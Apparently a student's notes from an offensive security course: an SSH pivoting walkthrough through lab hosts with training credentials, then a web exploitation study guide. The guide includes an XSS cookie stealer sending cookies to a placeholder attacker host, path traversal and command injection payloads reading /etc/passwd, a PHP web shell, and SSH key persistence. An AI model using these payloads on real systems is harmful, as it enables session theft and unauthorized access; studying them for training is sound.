# Reconnaissance & Scanning

## Demo Scheme of Maneuver
The network path is structured from the Jump Box through a pivot point to reaching internal targets:

* **Jump Box**
    * **Pivot:** 192.168.28.105
        * **T1:** 192.168.28.27
        * **T2:** 192.168.28.12

### Target Section
#### Pivot Host

| Attribute | Details |
| :--- | :--- |
| **Hostname** | Donovian-Terminal |
| **IP Address** | `192.168.28.105` |
| **OS** | Ubuntu 18.04 |
| **Credentials** | `comrade` :: `StudentReconPassword` |
| **SSH Port** | 2222 |
| **PSP** | rkhunter |
| **Malware** | none |
| **Action** | Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved. |


#### Target 1 (T1)
| Attribute | Details |
| :--- | :--- |
| **Hostname** | unknown |
| **IP Address** | `192.168.28.27` |
| **OS** | Linux ver: Unknown |
| **Credentials** | `comrade` :: `StudentPrivPassword` |
| **Last Known Ports** | unknown |
| **PSP** | unknown |
| **Malware** | unknown |
| **Action** | Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access. |


#### Target 2 (T2)
| Attribute | Details |
| :--- | :--- |
| **Hostname** | unknown |
| **IP Address** | `192.168.28.12` |
| **OS** | Linux ver: Unknown |
| **Credentials** | `comrade` :: `StudentPrivPassword` |
| **Last Known Ports** | unknown |
| **PSP** | unknown |
| **Malware** | unknown |
| **Action** | Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access. |

### Walkthrough
#### 1. Establish Master Control to JumpBox
```bash
ssh -MS /tmp/jump student@10.50.15.247
# Creds: jSmJnXaaKOs7

for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null; done

ssh -S /tmp/jump JumpBox-Tunnel -O forward -L 2222:192.168.28.105:2222
```

#### 2. Establish Master Control to Pivot (Donovian-Terminal)
```bash
ssh -MS /tmp/pivot comrade@192.168.28.105 -p 2222
# Creds: StudentReconPassword
```

#### 3. Start SOCKS Proxy (Masquerade)
```bash
ssh -S /tmp/pivot Pivot-Proxy -O forward -D 9050

# Cancel an active forwarding (if needed)
# ssh -S /tmp/<name> <Host Alias> -O cancel -KD 9050
```

#### 4. Validate Pivot for T1/T2
```bash
proxychains nmap -Pn 192.168.28.27 192.168.28.12 # Both 22 ssh
```

#### 5. Pivot to T1
```bash
ssh -S /tmp/pivot T1-Tunnel -O forward -L 1111:192.168.28.27:22

# Now, establish a new master socket for T1
ssh -MS /tmp/t1 comrade@localhost -p 1111
# Creds: StudentPrivPassword
```

#### 6.  Pivot to T2
```bash
# Create the tunnel using port 3333
ssh -S /tmp/pivot T2-Tunnel -O forward -L 3333:192.168.28.12:22

# Establish the master socket for T2
ssh -MS /tmp/t2 comrade@localhost -p 3333
# Creds: StudentPrivPassword
```

#### Current Port Map Breakdown:
> Port 2222: Mapped to Pivot (.105) — Active
> 
> Port 1111: Mapped to T1 (.27) — Active
> 
> Port 3333: Mapped to T2 (.12) — New

---

# Web Exploitation Day 1:
### Fundamentals Study Guide

## 1.0 Web Fundamentals
*   **Server/Client Relationship**: Client (Browser) requests; Server provides resources.
*   **HTTP Protocol**:
    *   `GET`: Retrieve data.
    *   `POST`: Submit data.
*   **CLI Tools**:
    *   `cURL`: Test APIs and make manual requests.
    *   `WGET`: Batch download or mirror sites.

---

## 2.0 - 4.1 Website Enumeration
*Phase: Discovery. Goal: Identify pages, directories, and vulnerabilities.*

### Key Files
*   **robots.txt**: Located at `http://<IP>/robots.txt`. Lists disallowed paths (e.g., `/admin`, `/backup`).

### Tools & Commands
> **Note**: Use `proxychains` for TCP support. ICMP is NOT supported.


| Tool | Command | Purpose |
| :--- | :--- | :--- |
| **NMAP (Enum)** | `proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>` | Brute-forces common hidden paths. |
| **NMAP (SQLi)** | `proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>` | Finds forms vulnerable to SQL injection. |
| **NMAP (Robots)**| `proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>` | Parses the robots.txt file automatically. |
| **Nikto** | `nikto -h <IP>` | Comprehensive web vulnerability scanner. |

---

## 4.2 - 5.1 Cross-Site Scripting (XSS)
*Injection of malicious client-side JavaScript.*

### Types of XSS
1.  **Reflected (Non-Persistent)**: Script is reflected via a link (e.g., URL parameters). One-time attack.
2.  **Stored (Persistent)**: Script is saved to the database (e.g., comments). Affects all visitors.

### Useful Payloads
*   **Basic Alert (PoC)**: `<script>alert('XSS');</script>`
*   **Cookie Stealer**: 
    ```javascript
    <script>document.location="http://<ATTACKER_IP>/stealer.php?username=" + document.cookie;</script>
    ```
*   **Exfiltration Objects**: `document.cookie` (session tokens), `document.body.innerHTML` (page content).

### Defenses
*   **CORS**: Cross-Origin Resource Sharing.
*   **CSP**: Content Security Policy.

---

## 6.0 Server-Side Injection
*Targeting the server components directly.*

### 6.1 Directory Traversal (Arbitrary File Read)
*   **Action**: Using `../` to navigate outside the web root.
*   **Payload Example**: `http://<IP>/view.php?file=../../../../etc/passwd`
*   **Key Files to Check**: `/etc/passwd`, `/etc/shadow`, `/var/www/html/robots.txt`.

### 6.2 Malicious File Upload
*   **Action**: Uploading a script (e.g., PHP) to execute commands.
*   **Web Shell Example (`shell.php`)**:
    ```php
    <?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
    ```
*   **Execution**: Access via `http://<IP>/uploads/shell.php?cmd=whoami`.

### 6.3 Command Injection
*   **Action**: Chaining OS commands using `;`, `&&`, or `|`.
*   **Payload Example**: `127.0.0.1; cat /etc/passwd`

---

## 7.0 Persistence: SSH Key Upload
*Using injection/upload to gain passwordless shell access.*

1.  **Generate Key (Local)**: `ssh-keygen -t rsa`
2.  **View Public Key**: `cat ~/.ssh/id_rsa.pub`
3.  **Identify Target User**: `whoami` (e.g., `www-data`)
4.  **Find Home Directory**: `cat /etc/passwd | grep www-data` (e.g., `/var/www`)
5.  **Inject/Upload Key**:
    ```bash
    mkdir -p /var/www/.ssh
    echo "ssh-rsa <YOUR_KEY_STRING>" >> /var/www/.ssh/authorized_keys
    ```
6.  **Login**: `ssh www-data@<Target_IP>`

---

## Cleanup (Database)
To remove a stored XSS payload:
```sql
mysql
USE messages;
SELECT * FROM comments;
DELETE FROM comments WHERE id = <ID>;
